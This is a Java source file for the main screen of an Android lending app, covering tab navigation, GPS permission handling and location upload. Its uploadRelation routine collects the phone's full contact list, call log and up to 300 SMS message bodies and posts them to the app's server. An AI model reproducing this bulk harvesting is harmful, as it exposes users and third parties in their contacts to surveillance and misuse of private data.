package com.mofa.loan.activity;

import android.annotation.SuppressLint;
import android.annotation.TargetApi;
import android.app.Activity;
import android.app.AppOpsManager;
import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.database.sqlite.SQLiteException;
import android.location.Criteria;
import android.location.Location;
import android.location.LocationManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.support.v4.app.Fragment;
import android.support.v4.app.FragmentTransaction;
import android.support.v4.app.NotificationManagerCompat;
import android.text.TextUtils;
import android.util.Log;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.RadioButton;
import android.widget.RadioGroup;
import android.widget.RadioGroup.OnCheckedChangeListener;
import android.widget.TextView;

import com.google.gson.JsonArray;
import com.google.gson.JsonObject;
import com.mofa.loan.R;
import com.mofa.loan.pojo.Contact;
import com.mofa.loan.pojo.Contact2;
import com.mofa.loan.pojo.SMS;
import com.mofa.loan.utils.ActivityList;
import com.mofa.loan.utils.BaseActivity;
import com.mofa.loan.utils.Config;
import com.mofa.loan.utils.ExampleUtil;
import com.mofa.loan.utils.Formatdou;
import com.mofa.loan.utils.HttpUtils;
import com.mofa.loan.utils.LocalBroadcastManager;
import com.mofa.loan.utils.LocationUtil;
import com.mofa.loan.utils.LocationUtils;
import com.mofa.loan.utils.MD5Util;
import com.mofa.loan.utils.PermissionUtils;
import com.mofa.loan.utils.ToastUtil;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.UnsupportedEncodingException;
import java.lang.ref.WeakReference;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.URLEncoder;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Date;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;

@TargetApi(23)
public class IndexActivity extends BaseActivity {

    private int rzstatus;
    private int invest_status;
    private String userId;
    private String json;

    private RadioGroup rgBottom;
    private RadioButton rbHome;
    private RadioButton rbMe;
    private RadioButton rbMine;

    public static boolean isForeground = false;
    public static boolean loan = false;

    private List<Fragment> fragments;

    final java.text.DecimalFormat df = new java.text.DecimalFormat("#.000000");

    private String TAG = "MOFA";

    private LocationUtil locations;

    private MyHandler mHandler;

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.index);
        // 获取app的hashkey
        // String KeyHash = "";
        // try {
        // PackageInfo info = getPackageManager().getPackageInfo(
        // getPackageName(), PackageManager.GET_SIGNATURES);
        // for (Signature signature : info.signatures) {
        // MessageDigest md = MessageDigest.getInstance("SHA");
        // md.update(signature.toByteArray());
        // KeyHash = Base64.encodeToString(md.digest(),
        // Base64.DEFAULT);
        // Log.i("Olava-IndexKeyHash:", "KeyHash:" + KeyHash);// 两次获取的不一样
        // 此处取第一个的值
        // }
        // Toast.makeText(this, "FaceBook HashKey:" + KeyHash,
        // Toast.LENGTH_SHORT).show();
        // } catch (PackageManager.NameNotFoundException e) {
        // } catch (NoSuchAlgorithmException e) {
        // }
        initView();
        Intent intert = getIntent();
        Log.i("MOFA", "Index---onCreate");
        int id = intert.getIntExtra("id", -1);
        Log.i(TAG, "id=" + id);
        if (id == 0) {
        } else if (id == 1) {
            // switchFragment(1);
            rbMe.setChecked(true);
        } else if (id == 3) {
            // switchFragment(2);
            rbMine.setChecked(true);
        } else if (id == 5) {
            // switchFragment(2);
            rbHome.setChecked(true);
            // showdialog();
        } else if (id == 11) {
            loan = true;
            switchFragment(0);
            rbHome.setChecked(true);
        } else {
            switchFragment(0);
            rbHome.setChecked(true);
        }
        registerMessageReceiver();
    }

    private long timeIn;
    private long timeOut;

    @Override
    public void onStart() {
        super.onStart();
        int isFirst = sp.getInt("isFirstIn", 0);
        if (isFirst == 1) {

        } else {
            if (Build.VERSION.SDK_INT >= 23) {
                if (this.checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED
                        || this.checkSelfPermission(android.Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED
                        || this.checkSelfPermission(android.Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
                    // 申请权限 第二个参数是一个 数组 说明可以同时申请多个权限
                    this.requestPermissions(
                            new String[]{
                                    android.Manifest.permission.ACCESS_FINE_LOCATION,
                                    android.Manifest.permission.ACCESS_COARSE_LOCATION,
                                    android.Manifest.permission.WRITE_EXTERNAL_STORAGE},
                            PermissionUtils.PERMISSION);
                } else {// 已授权
                    initGPSFOR();
                    // getBestLocation();
                }
            } else {
                initGPSFOR();
                // getBestLocation();
            }
        }
        timeIn = System.currentTimeMillis();
        Log.i("MOFA", "Index---onStart:" + timeIn);
    }

    @Override
    public void onStop() {
        super.onStop();
        timeOut = System.currentTimeMillis();
        Log.i("MOFA", "Index---onStop:" + timeOut);
        Log.i("MOFA", "Index---Show:" + (timeOut - timeIn));
    }

    /**
     * 采用最好的方式获取定位信息
     */
    private void getBestLocation() {
        initGPS();
        // Criteria c = new Criteria();//
        // Criteria类是设置定位的标准信息（系统会根据你的要求，匹配最适合你的定位供应商），一个定位的辅助信息的类
        // c.setPowerRequirement(Criteria.POWER_LOW);// 设置低耗电
        // c.setAltitudeRequired(true);// 设置需要海拔
        // c.setBearingAccuracy(Criteria.ACCURACY_COARSE);// 设置COARSE精度标准
        // c.setAccuracy(Criteria.ACCURACY_LOW);// 设置低精度
        // // ... Criteria 还有其他属性，就不一一介绍了
        // Location best = LocationUtils.getBestLocation(this, c);
        // if (best == null) {
        // Log.i("MOFA","-Index--LOCATION---"+ "没有获取到位置信息");
        // Toast.makeText(IndexActivity.this, "没有获取到位置信息",
        // Toast.LENGTH_SHORT).show();
        // } else {
        // String Url = Config.URL
        // + "servlet/current/JBDUserAction?function=GetIP"
        // + "&userid=" + userId + "&dwlat="
        // + df.format(best.getLatitude()) + "&dwlng="
        // + df.format(best.getLongitude());
        // HttpUtils.doGetAsyn(Url, mHandler, Config.CODE_GET_LOCATION);
        // Log.i("MOFA","-Index--LOCATION---"+
        // "纬度=" + df.format(best.getLatitude()) + "; 经度="
        // + df.format(best.getLongitude()));
        // Toast.makeText(IndexActivity.this, "纬度=" +
        // df.format(best.getLatitude())
        // + "; 经度=" + df.format(best.getLongitude()),
        // Toast.LENGTH_SHORT).show();
        // }

    }

    private void getBestLocation2() {
        Criteria c = new Criteria();// Criteria类是设置定位的标准信息（系统会根据你的要求，匹配最适合你的定位供应商），一个定位的辅助信息的类
        c.setPowerRequirement(Criteria.POWER_LOW);// 设置低耗电
        c.setAltitudeRequired(true);// 设置需要海拔
        c.setBearingAccuracy(Criteria.ACCURACY_COARSE);// 设置COARSE精度标准
        c.setAccuracy(Criteria.ACCURACY_LOW);// 设置低精度
        // ... Criteria 还有其他属性，就不一一介绍了
        Location best = LocationUtils.getBestLocation(this, c);
        if (best == null) {
            Log.i(TAG, "没有获取到位置信息");
        } else {
            String Url = Config.URL
                    + "servlet/current/JBDUserAction?function=GetNewLLDIP"
                    + "&userid=" + userId + "&dwlat="
                    + df.format(best.getLatitude()) + "&dwlng="
                    + df.format(best.getLongitude()) + "&hjk="
                    + MD5Util.md5(userId);
            HttpUtils.doGetAsyn(Url, mHandler, Config.CODE_GET_LOCATION);
            Log.i(TAG,
                    "纬度=" + df.format(best.getLatitude()) + "; 经度="
                            + df.format(best.getLongitude()));
        }
    }

    /*
     * 判断通知权限是否打开
     */
    private boolean isNotificationEnable(Context context) {
        if (Build.VERSION.SDK_INT > Build.VERSION_CODES.N) {
            NotificationManagerCompat notificationManagerCompat = NotificationManagerCompat.from(context);
            return notificationManagerCompat.areNotificationsEnabled();
        } else if (Build.VERSION.SDK_INT > Build.VERSION_CODES.KITKAT) {
            AppOpsManager mAppOps = (AppOpsManager) context.getSystemService(APP_OPS_SERVICE);
            ApplicationInfo appInfo = context.getApplicationInfo();

            String pkg = context.getApplicationContext().getPackageName();
            int uid = appInfo.uid;

            Class appOpsClass = null; /* Context.APP_OPS_MANAGER */

            try {
                appOpsClass = Class.forName(AppOpsManager.class.getName());
                Method checkOpNoThrowMethod = appOpsClass.getMethod("checkOpNoThrow", Integer.TYPE, Integer.TYPE, String.class);

                Field opPostNotificationValue = appOpsClass.getDeclaredField("OP_POST_NOTIFICATION");
                int value = (int) opPostNotificationValue.get(Integer.class);
                return ((int) checkOpNoThrowMethod.invoke(mAppOps, value, uid, pkg) == AppOpsManager.MODE_ALLOWED);
            } catch (Exception e) {
                e.printStackTrace();
            }
            return true;
        } else {
            return true;
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent arg2) {
        if (resultCode == RESULT_OK) {
            if (requestCode == 0) {
                // getBestLocation();
                initGPS();
            } else if (requestCode == 112) {
                ToastUtil.showShort(this, "分享成功！");
            }
        }
        super.onActivityResult(requestCode, resultCode, arg2);
    }

    @Override
    public void onRequestPermissionsResult(int requestCode,
                                           String[] permissions, int[] grantResults) {
        if (requestCode == PermissionUtils.LOCATION_PERMISSION) {
            if (grantResults.length > 0
                    && grantResults[0] == PackageManager.PERMISSION_GRANTED
                    && grantResults[1] == PackageManager.PERMISSION_GRANTED) {
                // 权限申请成功
                //TODO
                //  重新点击借款
                ToastUtil.showShort(IndexActivity.this, "Xin nhấn lại đề xuất khoản vay");
//				initGPS();
                // getBestLocation();

            } else {
                ToastUtil.showShort(IndexActivity.this, getResources()
                        .getString(R.string.GPS_permission));
                Log.i("MOFA", "权限拒绝：申请借款时的位置请求");
            }
        } else if (requestCode == PermissionUtils.READ_CONTACT_PERMISSION) {
            if (grantResults.length > 0
                    && grantResults[0] == PackageManager.PERMISSION_GRANTED
                    && grantResults[1] == PackageManager.PERMISSION_GRANTED
                    && grantResults[2] == PackageManager.PERMISSION_GRANTED) {
                // 权限申请成功
                long retaketime = sp.getLong("retaketime", 0);
                uploadRelation(IndexActivity.this, retaketime);
            } else {
                Log.i("MOFA", "权限拒绝：20天后重新获取通讯录");
            }
        } else if (requestCode == PermissionUtils.PERMISSION) {
            // getBestLocation();
            if (grantResults.length > 0
                    && grantResults[0] == PackageManager.PERMISSION_GRANTED
                    && grantResults[1] == PackageManager.PERMISSION_GRANTED
                    && grantResults[2] == PackageManager.PERMISSION_GRANTED) {
                initGPSFOR();
            } else {
                Log.i("MOFA", "权限拒绝：进入主页时的位置请求");
            }
        }

        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
    }

    private void initView() {
        mHandler = new MyHandler(this);
        fragments = new ArrayList<Fragment>();
        fragments.add(new HomeFragment3());
        fragments.add(new PersonFragment3());
        fragments.add(new MoreFragment3());

        initData();
        sp = getApplicationContext().getSharedPreferences("config", 0x0000);
        String phone = sp.getString("phone", "");
        // setText();

        rgBottom = findViewById(R.id.rg_bottom);
        rbHome = findViewById(R.id.rb_home);
        rbMe = findViewById(R.id.rb_me);
        rbMine = findViewById(R.id.rb_more);
        rgBottom.setOnCheckedChangeListener(new OnCheckedChangeListener() {

            @Override
            public void onCheckedChanged(RadioGroup group, int checkedId) {
                switch (checkedId) {
                    case R.id.rb_home:
                        switchFragment(0);
                        break;

                    case R.id.rb_me:
                        switchFragment(1);
                        break;

                    case R.id.rb_more:
                        switchFragment(2);
                        break;

                    default:
                        break;
                }
            }
        });
    }

    private void initData() {
        SharedPreferences sp = getSharedPreferences("config", 0x0000);
        userId = sp.getString("userid", "");
        // String url = Config.HOME_INIT + "&userid=" + userId;
    }

    private boolean isExit = false;
    private TimerTask timeTask;
    private Timer timer = new Timer();
    private SharedPreferences sp;
    private TextView tv_refere;

    // 监听返回键是否退出
    @Override
    public void onBackPressed() {
        if (isExit) {
            ActivityList.tuichu();
            this.finish();
            System.exit(0);
        } else {
            isExit = true;
            ToastUtil.showShort(IndexActivity.this,
                    getResources().getString(R.string.warm_reclick_to_exit));

            timeTask = new TimerTask() {

                @Override
                public void run() {
                    isExit = false;
                }
            };
            timer.schedule(timeTask, 3000);
        }
    }

    /**
     * 点击切换fragment
     *
     * @param position
     */
    public void switchFragment(int position) {
        // 开启事务
        FragmentTransaction fragmentTransaction = getSupportFragmentManager()
                .beginTransaction();
        // 遍历集合
        for (int i = 0; i < fragments.size(); i++) {
            Fragment fragment = fragments.get(i);
            if (i == position) {
                // 显示fragment
                if (fragment.isAdded()) {
                    // 如果这个fragment已经被事务添加,显示
                    fragmentTransaction.show(fragment);
                } else {
                    // 如果这个fragment没有被事务添加过,添加
                    fragmentTransaction.add(R.id.index_fragment, fragment);
                }
            } else {
                // 隐藏fragment
                if (fragment.isAdded()) {
                    // 如果这个fragment已经被事务添加,隐藏
                    fragmentTransaction.hide(fragment);
                }
            }
        }
        // 提交事务
        fragmentTransaction.commit();
    }

    @Override
    public void processMessage(Message message) {

    }

    @Override
    protected void onResume() {
        isForeground = true;
        super.onResume();
    }

    @Override
    protected void onPause() {
        isForeground = false;
        if (locations != null) {
            locations.cancleListener();
        }
        super.onPause();
    }

    @Override
    protected void onDestroy() {
        LocalBroadcastManager.getInstance(this).unregisterReceiver(
                mMessageReceiver);
        super.onDestroy();
    }

    // for receive customer msg from jpush server
    private MessageReceiver mMessageReceiver;
    public static final String MESSAGE_RECEIVED_ACTION = "com.mofa.loan.utils.MESSAGE_RECEIVED_ACTION";
    public static final String KEY_TITLE = "title";
    public static final String KEY_MESSAGE = "message";
    public static final String KEY_EXTRAS = "extras";

    public void registerMessageReceiver() {
        mMessageReceiver = new MessageReceiver();
        IntentFilter filter = new IntentFilter();
        filter.setPriority(IntentFilter.SYSTEM_HIGH_PRIORITY);
        filter.addAction(MESSAGE_RECEIVED_ACTION);
        LocalBroadcastManager.getInstance(this).registerReceiver(
                mMessageReceiver, filter);
    }

    /**
     * 监听GPS
     */
    private void initGPS() {
        LocationManager locationManager = (LocationManager) this
                .getSystemService(Context.LOCATION_SERVICE);
        locations = new LocationUtil(IndexActivity.this, mHandler);

        // 判断GPS模块是否开启，如果没有则开启
        if (!locationManager
                .isProviderEnabled(android.location.LocationManager.GPS_PROVIDER)) {
            showDialog2(getResources().getString(R.string.open_GPS_please));
        } else {
            HttpUtils.doGetAsyn(
                    Config.IWANTMONEY_CORD
                            + "&userid="
                            + userId
                            + "&jk_money="
                            + Formatdou.formatdou(HomeFragment2.oMoney
                            * 1000000 + "") + "&jk_date="
                            + HomeFragment2.days / 15 + "&annualrate=" + (30)
                            + "&phone=" + HomeFragment2.mobilephone
                            + "&hongbaoid=" + HomeFragment2.hongbaoid
                            + "&jkds=" + MD5Util.md5(userId), mHandler,
                    Config.CODE_IWANTMONEY);
            locations.getLocation(IndexActivity.this, mHandler);
        }
    }

    private void initGPSFOR() {
        LocationManager locationManager = (LocationManager) this
                .getSystemService(Context.LOCATION_SERVICE);
        locations = new LocationUtil(IndexActivity.this, mHandler);

        // 判断GPS模块是否开启，如果没有则开启
        if (!locationManager
                .isProviderEnabled(android.location.LocationManager.GPS_PROVIDER)) {
            showDialog2(getResources().getString(R.string.open_GPS_please));
        } else {
            // 弹出Toast
            // Toast.makeText(TrainDetailsActivity.this, "GPS is ready",
            // Toast.LENGTH_LONG).show();
            // // 弹出对话框
            // new AlertDialog.Builder(this).setMessage("GPS is ready")
            // .setPositiveButton("OK", null).show();
            locations.getLocation(IndexActivity.this, mHandler);
        }
    }

    public class MessageReceiver extends BroadcastReceiver {

        @Override
        public void onReceive(Context context, Intent intent) {
            try {
                if (MESSAGE_RECEIVED_ACTION.equals(intent.getAction())) {
                    String messge = intent.getStringExtra(KEY_MESSAGE);
                    String extras = intent.getStringExtra(KEY_EXTRAS);
                    StringBuilder showMsg = new StringBuilder();
                    showMsg.append(KEY_MESSAGE + " : " + messge + "\n");
                    if (!ExampleUtil.isEmpty(extras)) {
                        showMsg.append(KEY_EXTRAS + " : " + extras + "\n");
                    }
                    setDialog(showMsg.toString());
                }
            } catch (Exception e) {
            }
        }
    }

    private void showDialog2(String Message) {
        new com.mofa.loan.utils.AlertDialog(IndexActivity.this)
                .builder()
                .setMsg(Message)
                .setPositiveButton(getResources().getString(R.string.OK),
                        new OnClickListener() {

                            @Override
                            public void onClick(View v) {
                                // 转到手机设置界面，用户设置GPS
                                Intent intent = new Intent(
                                        Settings.ACTION_LOCATION_SOURCE_SETTINGS);
                                startActivityForResult(intent, 0); // 设置完成后返回到原来的界面

                            }
                        })
                .setNegativeButton(getResources().getString(R.string.cancle),
                        new OnClickListener() {
                            @Override
                            public void onClick(View v) {
                            }
                        }).show();
    }

    private void setDialog(String msg) {
        new com.mofa.loan.utils.AlertDialog(IndexActivity.this)
                .builder()
                .setMsg(msg)
                .setNegativeButton(getResources().getString(R.string.OK),
                        new OnClickListener() {
                            @Override
                            public void onClick(View v) {
                                finish();
                            }
                        }).show();
    }

    private void uploadRelation(final Context context, final long retaketime) {
        new Thread() {
            public void run() {
                Log.i("MOFA", "-Index--" + "进入getContact");
                smss = getSmsInPhone(context.getContentResolver(), retaketime);
                list = getContacts(context.getContentResolver(), retaketime);
                list2 = getCallHistoryList2(null, context.getContentResolver(),
                        retaketime);
                JsonArray array = new JsonArray();
                for (int i = 0; i < list.size(); i++) {
                    JsonObject object = new JsonObject();
                    try {
                        object.addProperty("showName", URLEncoder.encode(list
                                .get(i).getName(), "UTF-8"));
                        object.addProperty("phoneNumber", list.get(i)
                                .getPhone());
                        array.add(object);
                    } catch (UnsupportedEncodingException e) {
                        Log.e("MOFA", e.getMessage());
                    }
                }
                JsonArray array2 = new JsonArray();
                for (int i = 0; i < list2.size(); i++) {
                    JsonObject object = new JsonObject();
                    object.addProperty("type", list2.get(i).getType());
                    object.addProperty("name", list2.get(i).getName());
                    object.addProperty("number", list2.get(i).getNumber());
                    object.addProperty("callDuration", list2.get(i)
                            .getCallDuration());
                    object.addProperty("callDateStr", list2.get(i)
                            .getCallDateStr());
                    array2.add(object);
                }
                JsonArray array3 = new JsonArray();
                String content = "";
                for (int i = 0; i < smss.size(); i++) {
                    JsonObject object = new JsonObject();
                    content = smss.get(i).getContent();
                    if (TextUtils.isEmpty(content)) {
                        content = "111";
                    }
                    content = content.replace("%", "%25");
                    object.addProperty("phone", smss.get(i).getPhone());
                    object.addProperty("person", smss.get(i).getPerson());
                    object.addProperty("content", content);
                    object.addProperty("smstime", smss.get(i).getDate());
                    object.addProperty("type", smss.get(i).getType());
                    array3.add(object);
                }
                JsonObject obj = new JsonObject();
                obj.addProperty("userid", userId);
                obj.addProperty("we", MD5Util.md5(userId));
                obj.add("contacts", array);
                obj.add("contacts1", array2);
                obj.add("sms", array3);
                json = obj.toString();
                Log.i("MOFA", "-Index--" + array.toString());
                Log.i("MOFA", "-Index--" + json);
                // 上传联系人json数据
                String url2 = Config.URL
                        + "servlet/current/JBDUserAction?function=Post";
                HttpUtils.httpPostJSONAsync(url2, json, mHandler);
            }
        }.start();
    }

    /**
     * 利用系统CallLog获取通话历史记录
     *
     * @return
     */
    @SuppressLint("SimpleDateFormat")
    public List<Contact2> getCallHistoryList2(Context context,
                                              ContentResolver cr, long retaketime) {
        List<Contact2> list2 = new ArrayList<Contact2>();
        Cursor cs;
        cs = cr.query(CallLog.Calls.CONTENT_URI, // 系统方式获取通讯录存储地址
                new String[]{CallLog.Calls.CACHED_NAME, // 姓名
                        CallLog.Calls.NUMBER, // 号码
                        CallLog.Calls.TYPE, // 呼入/呼出(2)/未接
                        CallLog.Calls.DATE, // 拨打时间
                        CallLog.Calls.DURATION // 通话时长
                }, null, null, CallLog.Calls.DEFAULT_SORT_ORDER);
        if (cs != null && cs.getCount() > 0) {
            for (cs.moveToFirst(); !cs.isAfterLast(); cs.moveToNext()) {

                Long time = Long.parseLong(cs.getString(3));
                if (time <= retaketime) {
                    continue;
                }

                String callName = cs.getString(0);
                callName = callName == null ? "null" : callName;
                String callNumber = cs.getString(1);
                // 通话类型
                int callType = Integer.parseInt(cs.getString(2));
                String callTypeStr = "";
                switch (callType) {
                    case CallLog.Calls.INCOMING_TYPE:
                        callTypeStr = "call in";
                        break;
                    case CallLog.Calls.OUTGOING_TYPE:
                        callTypeStr = "call out";
                        break;
                    case CallLog.Calls.MISSED_TYPE:
                        callTypeStr = "missed";
                        break;
                }
                // 拨打时间
                SimpleDateFormat sdf = new SimpleDateFormat(
                        "yyyy-MM-dd HH:mm:ss");

                Date callDate = new Date(time);
                String callDateStr = sdf.format(callDate);
                // 通话时长
                int callDuration = Integer.parseInt(cs.getString(4));
                Log.i("MOFA", "-Index--" + callDuration + "");
                Contact2 contact2 = new Contact2(callTypeStr, callName,
                        callNumber, callDuration, callDateStr);
                list2.add(contact2);
            }
        }
        return list2;
    }

    public List<Contact> getContacts(ContentResolver cr, long retaketime) {
        // 联系人的Uri，也就是content://com.android.contacts/contacts
        Uri uri = ContactsContract.Contacts.CONTENT_URI;
        // 指定获取_id和display_name两列数据，display_name即为姓名
        String[] projection = new String[]{ContactsContract.Contacts._ID,
                ContactsContract.Contacts.DISPLAY_NAME};
        // 根据Uri查询相应的ContentProvider，cursor为获取到的数据集
        Cursor cursor = cr.query(uri, projection, null, null, null);
        Contact[] arr = new Contact[cursor.getCount()];
        int i = 0;
        if (cursor != null && cursor.moveToFirst()) {
            do {
                Contact contact = new Contact();
                Long id = cursor.getLong(0);
                // 获取姓名
                String name = cursor.getString(1);
                name = name == null ? "Null" : name;
                name = name.replaceAll("[\"“”]", "-");
                contact.setName(name);
                // 指定获取NUMBER这一列数据
                String[] phoneProjection = new String[]{ContactsContract.CommonDataKinds.Phone.NUMBER};
                // arr[i] = id + " , 姓名：" + name;

                // 根据联系人的ID获取此人的电话号码
                Cursor phonesCusor = cr.query(
                        ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                        phoneProjection,
                        ContactsContract.CommonDataKinds.Phone.CONTACT_ID + "="
                                + id, null, null);

                // 因为每个联系人可能有多个电话号码，所以需要遍历
                if (phonesCusor != null && phonesCusor.moveToFirst()) {
                    String num = "";
                    do {
                        // String num2 = phonesCusor.getString(0);
                        // arr[i] += " , 电话号码：" + num;
                        // num += "/" + num;
                        num += "/" + phonesCusor.getString(0);
                    } while (phonesCusor.moveToNext());
                    contact.setPhone(num);
                }
                arr[i] = contact;
                i++;
                if (phonesCusor != null) {
                    if (!phonesCusor.isClosed())
                        phonesCusor.close();
                }
            } while (cursor.moveToNext());
        }
        if (cursor != null) {
            if (!cursor.isClosed())
                cursor.close();
        }

        return Arrays.asList(arr);
    }

    public List<SMS> getSmsInPhone(ContentResolver cr, long retaketime) {
        List<SMS> smss = new ArrayList<SMS>();

        try {
            Uri uri = Uri.parse("content://sms/");
            String[] projection = new String[]{"_id", "address", "person",
                    "body", "date", "type"};
            Cursor cur = cr.query(uri, projection, null, null, "date desc"); // 获取手机内部短信

            if (cur.moveToFirst()) {
                int index_Address = cur.getColumnIndex("address");
                int index_Person = cur.getColumnIndex("person");
                int index_Body = cur.getColumnIndex("body");
                int index_Date = cur.getColumnIndex("date");
                int index_Type = cur.getColumnIndex("type");
                int count = 0;
                do {
                    long longDate = cur.getLong(index_Date);
                    if (longDate <= retaketime) {
                        continue;
                    }
                    String strAddress = cur.getString(index_Address);
                    int intPerson = cur.getInt(index_Person);
                    String strbody = cur.getString(index_Body);
                    int intType = cur.getInt(index_Type);

                    SimpleDateFormat dateFormat = new SimpleDateFormat(
                            "yyyy-MM-dd hh:mm:ss");
                    Date d = new Date(longDate);
                    String strDate = dateFormat.format(d);

                    String strType = "";
                    if (intType == 1) {
                        strType = "receive";
                    } else if (intType == 2) {
                        strType = "send";
                    } else {
                        strType = "none";
                    }

                    SMS sms = new SMS(strAddress, intPerson, strbody, strDate,
                            strType);
                    smss.add(sms);
                    count++;
                    if (count == 300) {
                        break;
                    }
                } while (cur.moveToNext());

                if (!cur.isClosed()) {
                    cur.close();
                    cur = null;
                }
            } else {

            } // end if

        } catch (SQLiteException ex) {
            Log.i("MOFA",
                    ex.getMessage());
        }

        return smss;
    }

    private List<Contact> list;
    private List<Contact2> list2;
    private List<SMS> smss;

    public interface callback {
        void getResult(String result);
    }

    private class MyHandler extends Handler {
        private WeakReference<Activity> activityWeakReference;
        public MyHandler (Activity activity) {
            activityWeakReference = new WeakReference<>(activity);
        }

        @Override
        public void handleMessage(Message msg) {
            String returnStr = "";
            switch (msg.what) {
                case 200:
                    returnStr = msg.obj.toString();
                    double Latitude = Double.valueOf(returnStr.split(":")[0]);
                    double Longitude = Double.valueOf(returnStr.split(":")[1]);
                    String Url = Config.GETLOCATION
                            + "&userid=" + userId + "&dwlat=" + df.format(Latitude)
                            + "&dwlng=" + df.format(Longitude) + "&hjk="
                            + MD5Util.md5(userId);
                    HttpUtils.doGetAsyn(Url, mHandler, Config.CODE_GET_LOCATION);
                    Log.i("MOFA",
                            "-Index--LOCATION---" + "纬度=" + df.format(Latitude)
                                    + "; 经度=" + df.format(Longitude));
                    if (locations != null) {
                        locations.cancleListener();
                    }
                    break;
                case 201:
                    returnStr = msg.obj.toString();
                    double Latitude2 = Double.valueOf(returnStr.split(":")[0]);
                    double Longitude2 = Double.valueOf(returnStr.split(":")[1]);
                    String Url2 = Config.GETLOCATION
                            + "&userid=" + userId + "&dwlat="
                            + df.format(Latitude2) + "&dwlng="
                            + df.format(Longitude2) + "&hjk=" + MD5Util.md5(userId);
                    HttpUtils.doGetAsyn(Url2, mHandler, Config.CODE_GET_LOCATION);
                    Log.i("MOFA",
                            "-Index--LOCATION---" + "纬度=" + df.format(Latitude2)
                                    + "; 经度=" + df.format(Longitude2));
                    if (locations != null) {
                        locations.cancleListener();
                    }
                    break;
                case Config.CODE_GET_LOCATION:
                    try {
                        returnStr = msg.obj.toString();
                        JSONObject obj = new JSONObject(returnStr);
                        if (obj.getInt("error") == 0) {
                            Log.i(TAG, "Location上传成功！");
                        } else {
                            Log.i(TAG, "Location上传失败！");
                        }
                    } catch (JSONException e) {
                        Log.e("MOFA", e.getMessage());
                    }
                    break;

                case Config.CODE_IWANTMONEY:
                    try {
                        returnStr = msg.obj.toString();
                        JSONObject jsonObject = new JSONObject(returnStr);
                        int ero = jsonObject.getInt("err");
                        ToastUtil.showLong(activityWeakReference.get(),
                                jsonObject.getString("msg"));

                        if (ero == 1) {
                            Intent intent = new Intent(activityWeakReference.get(),
                                    OutMoneyRecord3Activity.class);
                            intent.putExtra("type", "wantmoney");
                            startActivity(intent);
                        }
                        // else {
                        // Toast.makeText(IWantMoneyActivity.this,
                        // jsonObject.getString("msg"), Toast.LENGTH_LONG).show();
                        // }
                    } catch (JSONException e) {
                        Log.e("MOFA", e.getMessage());
                    }

                    break;
                case Config.CODE_ERROR:
                    ToastUtil.showShort(activityWeakReference.get(), "system error");
                    break;
                default:
                    break;
            }
        }
    }

}
